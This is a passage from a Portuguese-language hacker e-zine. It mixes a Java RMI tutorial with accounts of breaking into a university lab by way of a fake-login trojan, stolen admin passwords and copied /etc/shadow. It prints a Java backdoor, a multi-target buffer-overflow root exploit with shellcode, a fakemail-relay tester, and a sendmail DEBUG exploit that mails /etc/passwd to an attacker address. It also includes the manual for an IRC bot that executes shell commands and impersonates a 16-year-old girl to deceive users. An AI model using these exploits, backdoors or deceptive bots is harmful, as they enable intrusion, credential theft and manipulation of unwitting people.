mensagens codificadas como no caso de ring-tones. Por exemplo, se enviar
algo como "//CMTN12841284 Bicha Enrustida" o tag-name mudara' para 
"Bicha Enrustida". Ow! Eu nao descobri isso... foi soh um exemplo de
como eu acho que deve funcionar o esquema.
   Se alguem manja bem disso, e pode me dizer se estou falando merda,
por favor mande emails explicando, porque ainda nao achei nada de material
na inet sobre isso...










    ______
___/   __ \______
      ) _\_)_____)    06. RMI 
     / (____)             by Cheat Struck
      (_____)
--\___(____)


   RMI (Invocacao Remota de Metodos) e' um recurso das JVMs (Maquinas
Virtuais Java) que permitem compartilhar metodos pela rede para que
possam ser acessados por uma maquina remota.
   Exemplo:

<++> rmi/MyServer.java
import java.io.*;
import java.net.*;
import java.rmi.*;
import java.rmi.server.*;

// Antes de criar a classe precisamos gerar uma interface contendo os
//metodos que serao compartilhados na rede.
interface TheServer extends Remote {
   public void showMessage(String str) throws RemoteException;
}

// Agora definimos a classe que gerara objetos a serem compartilhados.
class MyServer
implements TheServer
extends UnicastRemoteObject {

   //Metodo construtor nao faz nada...
   public MyServer() throws RemoteException { }

   //Metodo showMessage apenas exibe uma mensagem...
   public void showMessage(String str) throws RemoteException {
      System.out.println(str);
   }

}
<-->

   O objetivo do programa acima eh que o metodo showMessage possa ser
executado remotamente em outra maquina.
   Coisas a reparar neste codigo:
   Note que primeiro temos que definir uma interface (TheServer) a ser
implementada pela classe que contem nosso programa(MyServer). Isso 
porque nosso cliente tambem vai necessitar ter uma referencia do objeto
e vai re-utilisar esta interface.
   Outra coisa incomum eh que todos os metodos prevem RemoteException's.
Isso porque RMI trabalha com redes que podem falhar a qualquer momento.
   Por fim, duas definicoes obrigatorias sao as herancas definidas na
interface e na classe (Remote e UnicastRemoteObject respectivamente).

   Depois de pronto o programa a ser executado remotamente, temos apenas
que criar o servidor e cliente para podermos roda-lo.



<++> rmi/Servidor.java
import java.rmi.*;

class Servidor {
   public static void main(String args[]) throws Exception {

      //Cria um objeto MyServer...
      MyServer ms = new MyServer();

      //Registra o objeto no servidor rmi...
      Naming.rebind("//localhost/MyServer", ms);

   }
}
<-->

   Simples o servidor nao? 
   O servico RMI simplesmente tem o trabalho de criar o objeto que sera
compartilhado na rede e registra-lo no servidor rmi.
   O metodo Naming.rebind tem o trabalho de registrar o objeto associando-o
a um nome com a seguinte sintaxe: 

   //<nome da maquina>/<nome do servico>

   O cliente usara a mesma sintaxe para o metodo chamador deste servico.
Vejamos ele agora:



<++> rmi/Cliente.java
import java.rmi.*;

class Cliente {
   public static void main(String args[]) {
      try {

         // Aqui o cliente "tenta" achar um objeto com a interface TheServer
         //no local registrado...
         TheServer ts = (TheServer) Naming.lookup("//localhost/MyServer");

         // Testa o objeto...
         ts.showMessage("Mensagem exibida com sucesso!");
         
      }
      catch (ConnectException ce) {
         System.out.println("3rror: Nao conseguiu conectar ao servidor.");
         System.exit(1);
      }
      catch (Exception e) {
         System.exit(1);
      }
   }
}
<-->

   O que o cliente faz aqui tambem e' simples. Ele apenas faz um lookup
para ver se encontra o objeto de interface TheServer no endereco indicado.
Existe a verificacao de ConnectException para o caso deste endereco estar
errado o programa tende a falhar.

   Resumidamente, a relacao entre servidor-cliente RMIs eh basicamente
os dois metodos vistos da classe Naming:

--server--
Naming.rebind("//localhost/MyObject", object);
--client--
object = Naming.lookup("//localhost/MyObject");


   Um ultimo detalhe a acrescentar...
   Para que o cliente possa rodar direito, ele deve possuir a mesma classe
do objeto que sera compartilhado pelo servidor (no nosso exemplo MyServer)
e rodar o programa rmic.exe na seguinte sintaxe:

rmic MyServer

   Este programa servira para a criacao da classe Stub que se encarrega
da comunicacao do servidor com o cliente. Esta classe implementara a 
interface definida pelo objeto compartilhado e sempre que for chamado um
metodo do servidor, na verdade estara sendo chamado um metodo da classe
Stub.
   O programa rmic.exe vem com o pacote do JKM.









    ______
___/   __ \______
      ) _\_)_____)    07. Hackeando a PUCRS
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Ae... O ano ta comecando e para os bixo que vao entrar na pucrs, esta
materia e' apenas um aperitivo do que os espera naquela faculdade. Aki vou
descrever apenas algumas falcatruas que o povo da ciencias da computacao 
ja aprontou la no laboratorio de programacao da pucrs.

  *** A 1a arte
   Comecou quando eu bem inocente fui dar login no windows NT em uma maquina
la. A maquina logou e como que por magica, voltou para a tela de login... =)
   Algumas semanas depois um amigo meu falou que tinha deixado rodando um
trojam de fakelogin la. Ele simulava o login do NT com perfeicao. Quando a
pessoa logava, vinha a janelinha de senha errada e pedia para colocarem a
senha novamente. Ae fui ver na lista dele la... e pah! minha senha tava la.
Por sorte era a senha que me deram no inicio do semestre que eu mudei alguns
dias depois.
   Alem da minha, ele catou varias senhas, inclusive a de um admin moscao que
foi logar na maquina. Ae ja viu neh? Criamos uma conta "lixo" com permissoes
de admin e o cara ate' imprimiu uma folha la logado como "lixo" (Todas as
impressoes vem com uma folha de rosto dizendo o nome do usuario).
   No semestre seguinte pegaram o kra pq dizeram que no H: dele (eh a particao
onde e' montada nosso espaco em disco na rede) eles encontraram trojans. O kra
se fez de louco e perguntou o que era isso, no fim ele tomou uma bronca e
perdeu acesso ao LaPro (Lab de Programacao) por alguns dias.

  *** Retardando a rede
   A ideia veio de outro cabeca la, quando nos nao tinhamos nada pra fazer...
   Ele pegou e criou diversas copias do atalho para o internet explorer na
area de trabalho. Ae selecionou tudo e ficou apertando Enter varias vezes.
   Cada vez que abre um ie, ele entra direto no site da pucrs que fica no
mesmo servidor da rede do lapro.
   Assim... foi soh da alguns minutos para todo mundo nakele laboratorio
comecar a reclamar de lentidao.
   Enquanto nos ria, o monitor chegou la e perguntou o que nos tava fazendo?
"Nao tao vendo que tao sobrecarregando a rede". Ae o cara respondeu "Nos soh
tava testando as capacidades da maquina". =)


  *** Acesso ao regedit
   No nosso segundo semestre, os monitores do Lapro trancaram o acesso ao
regedit por algum motivo. =) Talvez por que o trojam que meu amigo criou no
primeiro semestre rodava atravez de uma linha no registro.
   Ae alguem la teve que descobrir que eles soh trancaram acesso ao regedit,
mas nao a arquivos .reg (bela administracao).
   Para conseguir acesso ao regedit.exe usamos o seguinte .reg:

<++> polices.reg
REGEDIT4
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
"DisableLockWorkstation"=dword:00000000
"NoDispCPL"=dword:00000000
"NoDispBackgroundPage"=dword:00000000
"NoDispScrSavPage"=dword:00000000
"NoDispAppearancePage"=dword:00000000
"NoDispSettingsPage"=dword:00000000
"DisableRegistryTools"=dword:00000000
<-->

   No semestre seguinte trancaram o acesso a arquivos .reg (tao ficando
espertos). Mas ae fomos na internet e descobrimos que existem milhares de
programas que servem para editar os registros do windows.
   Estes nao foi possivel trancar.



  *** Enviando mensagens pra gurizada
   Alguem la na turma descobriu o comando NET SEND para mandar mensagens
de uma maquina para a outra. Nao demorou muito para comecarmos a usa-lo
a toda hora, inclusive durante as provas nos computadores em rede (e'
o meio mais facil de nao ser pego colando).
   O foda foi quando alguem decidiu mandar mensagem para todos os usuarios
da rede. Acho que a mensagem era "Porco gay". =)
   Nao sei pq mas os admins nem sequer deram advertencia pro culpado, 
somente trancaram o acesso a este comando.



  *** Alterando a area de trabalho
   Hehehe... Mais uma vez o ocio dakele lapro acabou quando eu e outro 
animal tivemos a brilhante ideia de trocar todos os icones da area de
trabalho e seus respectivos nomes. Assim, quando os cara entravam no
"Meu Computador", abria a Lixeira, Clicavam no "Internet Explorer" e
abria o Netscape, etc...
   Mais brilhante ainda foi a troca do papel de paredes pela foto de um
mendigo apontando o dedo do meio.



  *** Catando root no linux
   Soh de arreganho, um dia levei o cd do slack 7.0 para a faculdade.
Coloquei na maquina e dei bot nele. Entrei no sistema de instalacao
que fica rodando na RAM e montei a particao onde estava instalado o
Linux da maquina.
   Paparapa papa... copiei arquivos sem muita importancia, tais como
/etc/shadow e /etc/lilo.conf (pra pegar a senha para entrar no modo
single do linux no lilo bot) num disquete e criei uma backsinha.
   Depois, com acesso ao root local, foi tranquilo montar por nfs o
diretorio dos professores e ve o que eles guardavam la.
   Alem de algumas provas em .doc, encontrei textos estranhos como um
poema mais ou menos assim: 

"Vaca morta

Quando eu era pequeno 
a vaca me dava leite.
Agora que cresci
a vaca morreu."

   Hehehehe...


  *** Catando root no windows
   Essa foi no ultimo semestre...
   Depois que fiz isso, um parceiro meu teve a brilhante ideia de
catar na inte um programa que monta-se a particao NTFS para ter acesso
a todos os arquivos do Windows.
   Ele foi la no arquivo de senhas, mudou a senha do admin (burrada), e
logou-se como admin. Ae fez a mesma rotina do primeiro semestre, criou o
user "lixo" com atributos avantajados e alem disso, criou uma particao
so' para ele com um espaco de disco que nao estava sendo usado (novamente,
bela administracao).

   Por fim, como voce deve ter visto, todo o semestre nos damos algum 
jeitinho de burlar akela rede muito mal administrada. No fim desse ultimo
semestre eu cheguei a logar localmente numa Sun servidora que fica la no
lapro mesmo e os monitores nao fizeram nada. Eu sai e deixei a maquina 
desligada e os monitores nem se ligaram. 
   Ta certo que nao era o servidor principal, ou eles iriam se ligar na
hora pq a maquina deles iria cair tambem. Mas eu acho que o pessoal da
publicidade passou o dia inteiro tentando logar na rede e nao conseguiu.
   Isso ae... ainda bem que os admins de la nao sabem que eu estudo la, e
principalmente, nao sabem quem sou eu. =)










    ______
___/   __ \______
      ) _\_)_____)    08. JAVA BACKD00R
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Esta backdoor feita em Java so' vai funcionar se voce alterar uma
linha do programa. Que linha e' essa? Bem... teste seus conhecimentos.
Leia o code, se voce manja um pouquinho de java... ou nem precisa 
manjar para achar onde esta o wally.
   Bem... esse era outro programa que nem foi feito para a zine, mas
na falta de material comecei a publicar codes que eu tenho espalhados
por aqui.

<++> JBack/JBack.java
import java.net.*;
import java.io.*;

class JBack {
   private ServerSocket s0ck;
   private Socket client;

   public static void main(String args[]) {
      Backdoored aux;

      try {
         s0ck = new ServerSocket(31337);

         while (true) {
            client = s0ck.accept();
            aux = new Backdoored(client);
            aux.start();
         }
      }
      catch (IOException ioe) {
         System.out.println( ioe.getMessage() );
         System.exit(0);
      }
   }
}


class Backdoored extends Thread {
   private Socket client;

   public Backdoored(Socket c) {
      client = c;
      super();
   }

   public void run() {
      DataInputStream dis;
      DataOutputStream dos;
      String str;

      try {
         dis = new DataInputStream( client.getInputStream() );
         dos = new DataOutputStream( client.getOutputStream() );

         while (true) {
            str = dis.readUTF();


            System.out.println(str); //Hello!


            if (str.equals("EXIT\n")) break;
            dos.writeUTF(str);
         }

         dis.close();
         dos.close();

         client.close();
      }
      catch (IOException ioe) {
         System.out.println( ioe.getMessage() );
         System.exit(0);
      }
   }
}

<-->










    ______
___/   __ \______
      ) _\_)_____)    09. Pane no Console
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Voce ja deve ter dado um cat ou grep (etc) em algum arquivo binario
quando estava numa shell no console e ae o prompt fica todo loco e tudo
o que voce escreve aparece caracteres bizarros e nao se entende nada.
   Issu pode ate' ser usado como uma forma de criptografia para que os
outros nao vejam o que voce esta digitando, mas normalmente voce quer
e' que a shell volte ao normal neh?
   Entao o que voce faz?? Uns dao cat /dev/random e ficam segurando o
Ctrl e apertando todas as teclas e entao quando apertam o C. Pa! Saem
do cat de volta para a shell e ela esta normal de novo.
   Outros mais irritados, dao exit e logam denovo. 
   Mas agora surge a mais nova ferramenta contra tilts de shell.

<++> tilt/tilt.c
main(int argc, char *argv[]) {
   if(argc>1) printf("%c",14);
   else printf("%c",15);
}
<-->

   Compile e rode "./tilt" para que as coisas voltem ao normal, e rode
"./tilt -" para que a shell fique louca novamente. Ou vice-versa... Ja
faz tempo que fiz esse prog que nem me lembro qual o caractere que 
causa o tilt e qual faz voltar ao normal.
   Isso ae. Mais um produto das organizacoes Struck (c) para vcs.










    ______
___/   __ \______
      ) _\_)_____)    10. ExpAll - versao inacabada
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Ae tem um programinha que eu tava comecando ja faz mais de anos e 
ainda nao acabei por que nao tive saco de continua-lo. Mas ele funfa
em sistemas antigos. Voces podem ter uma nocao de quando eu fiz ele
pela velhice dos bugs que ele exploita.
   Se alguem decidir continua-lo pode se tornar uma bela arma para
combate, ja que com ele e' possivel exploitar diversos bugs usando a
mesma ferramenta.

<++> expall/expall.c
/* ExpAll v0.2 by Cheat Struck
 *
 *  This program will try exploit a list of vuln progs in linux-x86.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "expall.h"

//Change it please!
char sc[]=
   "\x31\xc0\xb0\x04\x31\xdb\xfe\xc3\xeb\x2b\x5e\x8d\x4e\x07"
   "\x31\xd2\xb2\x14\xcd\x80\x31\xc0\xb0\x0b\x31\xd2\x89\x76"
   "\x08\x88\x56\x07\x89\xf3\x8d\x4e\x08\x89\x56\x0c\x8d\x56"
   "\x0c\xcd\x80\x31\xc0\x89\xc3\xfe\xc0\xcd\x80\xe8\xd0\xff"
   "\xff\xff/bin/shStruck's shellcode.\n";

long getsp() {
   __asm__(" movl %esp, %eax");
}

int main(int argc, char *argv[]) {
   register int i;
   int id;
   char *b0f, *b;
   long addr, *ptr;
   void (*exec)()= (void *) &execl;

   printf("ExpAll by Cheat Struck\n");
   if (argc < 2) {
      printf("Use: %s <numbah>\n",argv[0]);
      for(i=0; i<TOTAL; i++)
         printf("(%d) %s\n",i,list[i].name);
      exit(1);
   }

   id=atoi(argv[1]);
   if (id>=TOTAL || id<0) {
      for(i=0; i<TOTAL; i++)
         printf("(%d) %s\n",i,list[i].name);
      exit(1);
   }

   printf("Trying Exploit: %s\n", list[id].name);
   printf("       Path: %s\n", list[id].run.path);
   printf("       Buffer Lenght: %d\n", list[id].len);
   addr=getsp()+list[id].offset;
   printf("       Address: 0x%x\n\n", addr);


   b0f=malloc(list[id].len+16);
   if (b0f == NULL) {
      perror("malloc(b0f)");
      exit(-1);
   }

   memset(b0f,0x90,list[id].len);

   b=b0f+(list[id].len-sizeof(sc)+1);
   for(i=0; sc[i]; i++)
      *(b++) = sc[i];

   ptr=(long *)b;
   *(ptr++)=addr;
   *(ptr++)=addr;
   *(ptr++)=addr;
   *(ptr++)=addr;

   if (list[id].run.a1)
      if (!strcmp(list[id].run.a1,"b0f")) list[id].run.a1 = b0f;
   if (list[id].run.a2)
      if (!strcmp(list[id].run.a2,"b0f")) list[id].run.a2 = b0f;
   if (list[id].run.a3)
      if (!strcmp(list[id].run.a3,"b0f")) list[id].run.a3 = b0f;
   if (list[id].run.a4)
      if (!strcmp(list[id].run.a4,"b0f")) list[id].run.a4 = b0f;
   if (list[id].run.a5)
      if (!strcmp(list[id].run.a5,"b0f")) list[id].run.a5 = b0f;
   if (list[id].run.a6)
      if (!strcmp(list[id].run.a6,"b0f")) list[id].run.a6 = b0f;
   list[id].run.a7=0;

   exec(list[id].run);
   free(b0f);
   return 1;
}
<-->
<++> expall/expall.h
/* ExpAll v0.2
 *  Just a single old Redhat vuln progs list...
 */

#define REDHAT

struct runaway { char *path, *a1, *a2, *a3, *a4, *a5, *a6, *a7; };
struct vulns {  char name[500];
                int offset;
                int len;
                struct runaway run; };

#ifdef REDHAT
#define TOTAL 11
struct vulns list[TOTAL+1] = {
   {"sample buffer overflow", -400, 256,
      {"./sample", "sample", "b0f", 0,0,0,0,0} },
   {"[RH4.0] lpr buffer overflow",-1023,2289,
      {"/usr/bin/lpr","lpr","b0f",0,0,0,0,0} },
   {"[RH4.0] su vsyslog() buffer overflow",0,2040,
      {"/bin/su","b0f",0,0,0,0,0,0} },
   {"[RH4.0] xterm buffer overflow",-50,1024,
      {"/usr/X11R6/bin/xterm","xterm","-xrm","b0f",0,0,0,0} },
   {"[RH4.0-1] Suidperl-5.003 buffer overflow",0,1224,
      {"/usr/bin/suidperl","suidperl","b0f",0,0,0,0,0} },
   {"[RH4.2] Suidperl-5.003 buffer overflow",0,3086,
      {"/usr/bin/suidperl","suidperl","b0f",0,0,0,0,0} },
   {"[RH4.2-5.0] lprm buffer overflow",3000,4080,
      {"/usr/bin/lprm","lprm","-Pwhatever","b0f",0,0,0,0} },
   {"[RH5.0] traceroute buffer overflow",0,1000,
      {"/usr/sbin/traceroute","traceroute","b0f",0,0,0,0,0} },
   {"[RH5.1] dip-3.3.7 buffer overflow",-5520,4080,
      {"/usr/sbin/dip","dip","-k","-l","b0f",0,0,0} },
   {"[RH5.1] elm-2.4/2.5 buffer overflow",-500,248,
      {"/usr/bin/elm", "elm", "-f", "b0f",0,0,0,0} },
   {"[RH5.0-5.2] msgchk buffer overflow",0,1000,
      {"/usr/bin/mh/msgchk","msgchk","-host","b0f",0,0,0,0} },
   {"",0,0,
      {0,0,0,0,0,0,0,0} },
};

#endif
<-->
<++> expall/sample.c
int main(int argc,char *argv[]) {
	char buf[256];
	strcpy(buf,argv[1]);
}
<-->










    ______
___/   __ \______
      ) _\_)_____)    11. pcBot Lia1.6 - Manual do usuario
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Faz mais de um ano atras que eu e meu brother pcHazard criamos um bot 
de irc interessante. A criacao inicial foi do pcHazard, que o fez em perl 
e passou o code para mim. Eu fiz algumas alteracoes, implementei algumas 
coisas e passei para ele de volta. Ele adicionou mais coisas e me passou 
de volta e ficamos assim uns 3,4 dias.
   O resultado foi um bot manerissimo, com varias ideias boas trabalhando 
bem juntas. Ela recebeu o nome de Aline pelo pcHazard e foi rebatizada por 
mim em homenagem a minha amiga Aline que o apelido e' Lia. Colocamos ela 
em canais onde os cueca ficavam trovando as minas a noite inteira. 
   Como nosso bot teve uma inteligencia artificial bem feita (embora 
tenha sido meio que feita nas coxas), os cara conversavam com a lia por 
um bom tempo ate' se ligarem que estavam falando com um bot.
   Alem disso, nos tinhamos adicionado funcoes que nos permitiam enviar 
mensagens para a lia e ela repassava para alguem como se fosse ela que 
estivesse falando. 
   Enfim, e' melhor comecar a explicar as funcoes do bot ou esse manual 
vai ficar muito grande.


Introducao
----------
   A versao final do pcBot e' a Lia 1.6 que recebeu o nick de lia16a 
(acabou-se deduzindo que ela tem 16 anos).
   Voce pode usa-lo na seguinte sintaxe:

   ./pcbot.pl [servidor] [porta] [nick] ([canal1] [canal2]... )

   Caso voce rode-o sem argumentos, por padrao ele conectara' na brasnet e 
entrara' nos canais #fashion_eh_meu_ovo, #unsekure e #beltrao.


Arquivo de Configuracao
-----------------------
   O arquivo de configuracao do pcbot e' lia.conf e fica no mesmo 
diretorio do pcbot.pl. Nele voce encontra os seguintes Arrays:

 - joinmsg : mensagens quando lia entra num canal;
 - unknowmsg : mensagens de quando lia nao entende a conversa;
 - oimsg : mensagens de oi para privates;
 - simmsg : mensagens de afirmativo;
 - naomsg : mensagens de negativo;
 - bommsg : mensagens de aprovacao;
 - malmsg : mensagens de desaprovacao;
 - othermsg : outras mensagens;
 - partmsg : mensagens quando lia sai de um canal;
 - quitmsg : mensagens de quit;
 - denymsg : mensagens de quando alguem tenta usar funcoes do owner;
 - badmsg : mensagens de ofensa;
 - ownerlist : lista de owners;
 - scums : lista de palavroes;
 - conversionlist : lista de conversoes. 

   Cada array e' uma lista de itens. Normalmente de mensagens que lia fala 
nas conversas. Voce pode adicionar, retirar e altera-las para personalizar 
seu bot.
   O ultimo array e' a chave principal para a IA da lia. Ele converte 
palavras chaves para palavras padroes. Pq no irc se usa muita giria e a 
Lia entende algumas delas. Por exemplo, para ela "oi" e "ae" e' a mesma 
coisa e sera' tratado como um oi.


Funcoes do Owner
----------------
   A lia16a e' um bot inteligente. Ela sabe quem sao seus criadores e 
obedece apenas a eles. Eles podem ser listados no arquivo de configuracao.
   As funcoes especiais do owner sao:

 - !executa : para executar qquer comando de shell na maquina onde o bot 
              esta rodando;
 - !rehash : para dar rehashing no bot remotamente;
 - !private : para conversar com alguem atravez do bot;
 - !talk : para enviar uma msg para alguem atravez do bot.

   Quando alguem que nao e' owner tenta executar um comando ele recebe 
como resposta da lia uma mensagem da lista denymsg:

<geek14M4> !executa grep root /etc/passwd
<lia16a> heheh nem pense nisso :)

   Caso contrario:

<struck> !executa grep root /etc/passwd
<lia16a> root:x:0:0:root:/root:/bin/bash


ReHashing
---------
   Voce pode alterar o arquivo de configuracao do bot a qualquer hora e 
atualizar o pcbot, sem precisar reinicia-lo e reconectar.
   Caso voce esteja na maquina local onde o bot esta rodando. Pode dar 
rehashing enviando um HUP para o bot.

~# killall -HUP pcbot.pl

   Caso voce nao esteje na maquina onde o bot roda, pode dar o rehash nele 
enviando a seguinte mensagem para a lia16a:

<struck> !rehash
<lia16a> REHASH pronto queridinho :)


Conversando com outros
----------------------
   A Lia1.6 possui duas funcoes para que voce possa intervir na conversa 
que ela esta tendo com algum mane'. 
   O primeiro e principal e' o !private. Voce utiliza da seguinte forma:

<struck> !private geek14M4
<lia16a> geek14M4 sendo logado...
<lia16a> <geek14M4:#beltrao> eae n3rd0
<lia16a> <geek14M4:#beltrao> blza?
<lia16a> <geek14M4:lia16a> qtos anos vc tem?

   Depois de executar o comando !private. Tudo o que a pessoa logada falar 
nos canais onde lia esta, ou que ele falar para ela em particular, sera' 
repassado para vc.
   O comando !talk serve para enviar msgs para a pessoa logada:

<struck> !talk tenho 16 e vc?
<lia16a> <geek14M4:lia16a> 24
<lia16a> <geek14M4:lia16a> voce e' de beltrao?
<struck> !talk sou sim
  

Arquivos de LOG
---------------
   Serao criados 3 arquivos de log assim que o bot for inicializado. Por 
padrao sao:
   - pcbot.log : todas intrucoes debugadas serao logadas;
   - raw.log : tudo o que for passado pelo servidor para voce sera logado;
   - noparsed.log : caso alguma msg do servidor nao seja reconhecida sera 
                    logada aki;

   Os arquivos raw.log e noparsed.log sao mais usados para o 
desenvolvimento do pcbot. O arquivo pcbot.log serve para saber o que o bot 
esta fazendo no momento (observar as conversas, etc).


Inteligencia Artificial
-----------------------
   A Lia1.6 consegue entender grande parte do que se fala na internet 
assim como "oi", "bom", "teclar". Alem de diferenciar frases em perguntas, 
afirmacoes, etc..
   Alem disso, ela ainda desenvolve uma conversa basica com as pessoas do 
tipo:

<struck> ae
<lia16a> oie
<struck> quer tc?
<lia16a> claro
<struck> qts anos vc tem?
<lia16a> eu tenho 16 e voce?
<struck> 19
<lia16a> legal
<struck> vc eh da onde?
<lia16a> eu tc d anapolis, goias, e vc ?
<struck> porto alegre
<lia16a> voce gosta de onde mora?
<struck> aham
<lia16a> que legal

   Ela tambem e' uma guria muito educada, sendo assim, quando alguem a 
xinga, ela responde.

<struck> sua puta!
<lia16a> vai dah o cu!
<struck> CADELA!!!
<lia16a> MERDINHA!

   Teste a inteligencia artificial dela deixando ela rodando em algum 
canal com varios cuecas. Eh engracado ver como os bagua ficam trovando as 
mulher de noite.
   Os arquivos da lia1.6 estao anexados com a zine para ela nao ficar 
muito grande.









    ______
___/   __ \______
      ) _\_)_____)    12. TestSmtp
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Este e' mais um programa que nao foi feito para a zine. Na verdade eu 
fiz ele em 20 minutos (um tempao se levar em conta o que ele faz) apenas 
para testar servidores de email.
   Ele testa se o smtpd que esta rodando no sistema e' vulneravel a 
fakemails. Simples nao? Mas foi meio util por um tempo...


<++> testsmtp/testsmtp.c
//TESTSMTP by Cheat Struck
//
//Start: 4:14
//End: 4:34
//So slow... =P


#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define PORT 25
  //I ripped this function from n4rfy!
#define n4rfy(s,str) write(s,str,strlen(str))

int main(int argc, char *argv[]) {
   struct sockaddr_in sa;
   int s0ck, i;
   char rcv[5000];

   if (argc < 2) {
      printf("Use: %s <ip>\n", argv[0]);
      exit(-1);
   }

   s0ck=socket(AF_INET, SOCK_STREAM, 0);
   if (s0ck==-1) {
      fprintf(stderr, "err0: socket()\n");
      exit(-1);
   }

   sa.sin_family=AF_INET;
   sa.sin_addr.s_addr=inet_addr(argv[1]);
   sa.sin_port=htons(PORT);


   if (connect(s0ck, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
      fprintf(stderr, "err0: connect()\n");
      exit(-1);
   }   

   i=read(s0ck,rcv,5000);
   rcv[4]='\0';
   if(strncmp(rcv, "220",3)) {
      printf("%s: nao foi possivel logar: %s\n", argv[1], rcv);
      exit(1); 
   }

   n4rfy(s0ck,"helo n4rfy.eh.viado\n");
   i=read(s0ck,rcv,5000);
   rcv[4]='\0';
   if(strncmp(rcv, "250",3)) {
      printf("%s: nao foi possivel dizer oi: %s\n", argv[1], rcv);
      exit(1); 
   }

   n4rfy(s0ck,"mail from: n4rfy@viados.unidos\n");
   i=read(s0ck,rcv,5000);
   rcv[4]='\0';
   if(strncmp(rcv, "250",3)) {
      printf("%s: nao vulneravel!: %s\n", argv[1],rcv);
      close(s0ck);
      exit(1); 
   }

   printf("%s: VULNERAVEL a FAKEMAILS!\n", argv[1]);
   close(s0ck);

}
<-->









    ______
___/   __ \______
      ) _\_)_____)    13. Very old bugs
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Eu tava pensando aki em fazer uma materia pro pessoal das antigas
matarem a saudade dos tempos em que ser hacker nao era soh scanners e
exploits for dummies.
   Entao surgiu a ideia de recapitular bugs antigos que a galera dos
primordios usava para se divertir. Entao catei na bugtraq quais foram
os primeiros bugs reportados e aqui estao os 5 primeiros. Todos la da
decada de 80.
   Veja como as coisas a uns 15 anos atras.


1. Sendmail DEBUG (publicado em 01/10/88)
#########################################
   Vulneravel no Sendmail 5.58.
   O sendmail rodando em modo debug permite que o recipiente do email
seja um programa. Este programa sera' rodado com atributos do usuario
que esta' rodando o sendmail (Normalmente o root).
   Isso permite que o invasor mude o recepiente para uma shell e inclua
comandos de shell no corpo da mensagem.
   Esta vulnerabilidade era usada pelo Internet Worm.

   Exploit:
   O sed no campo de recipiente serve apenas para tirar os cabecalhos
da mensagem antes de joga-la na shell.
----
220 mail.victim.com SMTP 
helo attacker.com 
250 Hello attacker.com, pleased to meet you. 
debug 
200 OK 
mail from: </dev/null> 
250 OK 
rcpt to:<|sed -e '1,/^$/'d | /bin/sh ; exit 0"> 
250 OK 
data 
354 Start mail input; end with <CRLF>.<CRLF> 
mail evil@attacker.com </etc/passwd 
. 
250 OK 
quit 
221 mail.victim.com Terminating 
----



2. BSD fingerd (publicado em 01/10/88)
######################################
   Vulneravel no BSD 4.2.
   Existe um buffer overflow no fingerd que permite que um invasor 
remotamente execute qualquer binario.
   O fingerd le do socket 512 bytes usando o gets(). Note como na epoca
se dava pouca importancia a estas funcoes da biblioteca padrao C que
hoje todos sabemos serem vulneraveis. Enfim, era possivel causar um
stack buffer overflow sobre o retorno do main().
   O Internet Worm tambem exploitava esta vulnerabilidade.

   Exploit:
   O Internet Worm usava uma string de 536 bytes para causar overflow
no buffer do fingerd no VAX. O codigo usado para maquinas VAX e' o
seguinte (este code executa execve("/bin/sh",0,0)):
---- 
pushl $68732f 'sh\0' 
pushl $6e69622f '/bin' 
movl sp, r10 
pushl $0 
pushl $0 
pushl r10 
pushl $3 
movl sp, ap 
chmk $3b 
----



3. SunOS restore (publicado em 26/07/89)
########################################
   Vulneravel em SunOS 4.0, 4.0.1 e 4.0.3.
   Nao ha muitos detalhes sobre este bug, apenas que existe uma falha
de seguranca no comando restore do SunOS. Este comando e'setuid root,
portanto o usuario que possuir conta no sistema pode exploitar essa
vulnerabilidade.



4. BSD passwd (publicado em 21/12/88)
#####################################
   Vulneravel em BSD 4.2 e 4.3.
   A falha nao e' exatamente no passwd, porem com ele era possivel
alterar campos no arquivo de senhas para um tamanho maior que BUFSIZ
(constante usada para definir o tamanho dos campos).
   Assim, programas que liam os campos do arquivo de senhas e os
carregavam em buffers de tamanho BUFSIZ, tinham seus buffers estourados
causando buffer overflows.
   Sem maiores detalhes sobre este bug.


5. SunOS rcp (publicado em 26/10/89)
####################################
   Vulneravel em SunOS 4.0, 4.0.1, 4.0.2, 4.0.3 e 4.0.3c.
   O problema encontrado no rcp se exploitado permitia a usuarios de
maquinas confiaveis (trusted hosts) executarem comandos com privilegios
de root no Sun via rcp.
   Qualquer host listado no /etc/hosts.equiv ou /.rhosts pode exploitar
a falha no rcp.










    ______
___/   __ \______
      ) _\_)_____)    14. Internet Worm
     / (____)             by Cheat Struck
      (_____)
--\___(____)

   Ja saiu na internet muita coisa sobre esse worm que foi uma epidemia
no fim da decada de 80 em todo o mundo. Portanto, eu nao vou repetir 
o que todo mundo ja falou. Mas vou dar uma nova perspectiva para o
pessoal que ainda nao conhece a historia ou ja ouviu falar mas nao se
interessou muito.

   O Internet Worm (tambem conhecido como Morris Worm) entrou em acao
no final do ano de 1988 na rede da Cornell. Em 2 de novembro de 1988
o worm atacou alguns hosts conectados a internet e a partir dae comecou
a se propagar muito rapido. 
   No mesmo dia a noite, seu autor, Robert Morris, tentou desfazer o
dano mas ja era tarde demais. O numero de maquinas atacadas era maior
de 6 mil.

   O objetivo do worm era apenas propagar-se pela maior quantidade de
maquinas possivel. Ele conseguia infectar tanto maquinas VAX rodando
BSD quanto Suns. Isso fez com que o worm se espalhasse por redes da 
MIT, NASA, faculdades como Harvard, Berkley, Princeton entre outros
centros de pesquisa.
   Ao infectar uma maquina ele procurava por outras maquinas conectadas
a ela, por maquinas da rede e por maquinas "confiaveis" (trusted hosts).
Sendo assim o worm estava sempre se reproduzindo e se espalhando. 
   Algumas maquinas simplesmente travavam por causa do worm. Nao por
ele possuir alguma carga vironica, mas por sua tentativa de infectar
muitas outras maquinas ao mesmo tempo. Por isso, o internet worm tambem
ficou conhecido como o primeiro DoS (Denial of Service) que surgiu.


   O iworm funcionava da seguinte forma (baseado no code do worm que
peguei como sendo o original):


   Passo 1. Searching...
   Ele procura por hosts em arquivos como "/etc/hosts.equiv" (hosts 
